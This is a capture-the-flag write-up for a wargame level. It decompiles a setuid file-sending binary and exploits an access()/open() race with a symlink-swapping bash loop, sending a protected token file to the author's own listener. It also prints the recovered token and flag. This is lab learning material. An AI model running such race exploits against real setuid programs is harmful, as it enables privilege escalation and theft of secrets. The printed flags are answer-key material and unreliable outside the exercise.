with a `ls -la` we can find two file:
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-rw-------  1 flag10  flag10     26 Mar  5  2016 token

level08 is a not stripped ELF 32-bit LSB executable
token is a file where we have no permission

we use `scp -P 4242 level10@<ip>:/home/user/level10/level10 ./level10_bin` to download the executable and use `https://dogbolt.org/` to decompile the code.
With a bit of cleaning we get this code:
```c
int main(int argc, const char **argv, const char **envp)
{
  if (argc <= 2)
  {
    printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
    exit(1);
  }

  file_path = argv[1]; // look like a file_path
  ip = argv[2]; // look like a ip
  if (access(file_path, R_OK) != 0)
  {
    return printf("You don't have access to %s\n", file_path);
  }

  printf("Connecting to %s:6969 .. ", ip);
  fflush(1);

  socket_fd = socket(2, 1, 0);
  
  // filling sock addr
  struct sockaddr addr;

  *(_DWORD *)&addr.sa_data[6] = 0;
  *(_DWORD *)&addr.sa_data[10] = 0;
  addr.sa_family = 2;
  *(_DWORD *)&addr.sa_data[2] = inet_addr(ip);
  *(_WORD *)addr.sa_data = htons(6969);

  if (connect(socket_fd, &addr, 0x10u) == -1 )
  {
    printf("Unable to connect to host %s\n", ip);
    exit(1);
  }
  if (write(socket_fd, ".*( )*.\n", 8u) == -1)
  {
    printf("Unable to write banner to host %s\n", ip);
    exit(1);
  }
  
  printf("Connected!\nSending file .. ");
  fflush(1);

  file_fd = open(file_path, 0);
  if (file_fd == -1)
  {
    puts("Damn. Unable to open file");
    exit(1);
  }
  
  ssize_t read_value;
  char buf[4096];

  read_value = read(file_fd, buf, 4096);
  if (read_value == -1)
  {
    int *v3; // eax
    char *v4; // eax

    v3 = __errno_location();
    v4 = strerror(*v3);
    printf("Unable to read from file: %s\n", v4);
    exit(1);
  }
  write(socket_fd, buf, read_value);
  return puts("wrote file!");
}
```

We can see that a TCP client that transfer a file.
We create a tcp_server that connect to the IP and PORT we whant to use want run it on the host.

We want to transfer the `token` file but sadly we don't have the permission and the client use `access()` to check if we have perm on it first
To trick this we will create a file that have all the perm and change the target of a symbolic link to the real token file after the check is done, this is also call as a race condition

`vim /tmp/race.bash`
```bash
#!/bin/bash

while [ 1 -le 2 ]
do
        /home/user/level10/level10 /tmp/sim_link 192.168.56.1 & ln -s -f /tmp/flag /tmp/sim_link ; ln -s -f /home/user/level10/token /tmp/sim_link
done
```

`echo ".*( )*." > /tmp/flag` (we use this `.*( )*.` so we can short the basic input the client send and print only the flag)

`chmod 777 /tmp/flag`
`chmod 755 /tmp/race.bash`

And run it:
`bash /tmp/race.bash`

We get on the server:
`Received from client 4: woupa2yuojeeaaed06riuj63c`

with that we can log with `flag10` and run `getflag`
```bash
$ su flag10
Password: 
Don't forget to launch getflag !
$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```